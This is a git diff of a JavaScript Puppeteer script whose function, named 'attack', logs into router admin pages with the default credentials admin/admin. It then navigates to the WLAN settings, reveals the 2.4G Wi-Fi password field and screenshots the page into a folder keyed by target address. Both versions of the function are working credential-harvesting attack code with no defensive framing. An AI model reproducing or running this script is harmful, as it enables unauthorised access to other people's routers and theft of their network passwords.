@@ -1,36 +1,35 @@
-export default async function attackGM620(page, endereco) {
-    {
-        await page.focus("#Frm_Username");
-        await page.keyboard.type("admin");
-    }
-    {
-        await page.focus("#Frm_Password");
-        await page.keyboard.type("admin");
-    }
-    {
-        await page.click("#LoginId")
-    }
-    {
-        await page.waitForTimeout(5000)
-        const frame = page.frames()
-            .filter(frame => frame.url().includes("template") || frame.url().includes("getpage"))[0]
+const defaultUsername = "admin";
+const defaultPassword = "admin";
 
-        await page.waitForTimeout(500);
-        await frame.click("#mmNet");
+export default async function attack(page, endereco) {
 
-        await page.waitForTimeout(500);
-        await frame.click("#smWLAN");
+    await page.focus("#Frm_Username");
+    await page.keyboard.type(defaultUsername);
+    await page.focus("#Frm_Password");
+    await page.keyboard.type(defaultPassword);
+    await page.click("#LoginId");
 
-        await page.waitForTimeout(5000);
-        await frame.click("#Frm_Advan_PassSrc24G")
-    }
-    {
-        const enderecoUrlFoto = endereco
-            .replace("http://", "");
+    const frame = await page.waitForFrame(frame => {
+        return frame.url().includes("template") || frame.url().includes("getpage")
+    }, {
+        timeout: 5000
+    });
 
-        await page.screenshot({
-            path: `./fotos/${enderecoUrlFoto}.png`,
-            fullPage: true
-        });
-    }
+    await (await frame.waitForSelector("#mmNet", {
+        timeout: 2000
+    })).click();
+
+    await (await frame.waitForSelector("#smWLAN", {
+        timeout: 2000
+    })).click();
+
+    await (await frame.waitForSelector("#Frm_Advan_PassSrc24G", {
+        timeout: 2000
+    })).click();
+
+    await page.screenshot({
+        path: `./fotos/${endereco}.png`,
+        fullPage: true
+    });
+
 }
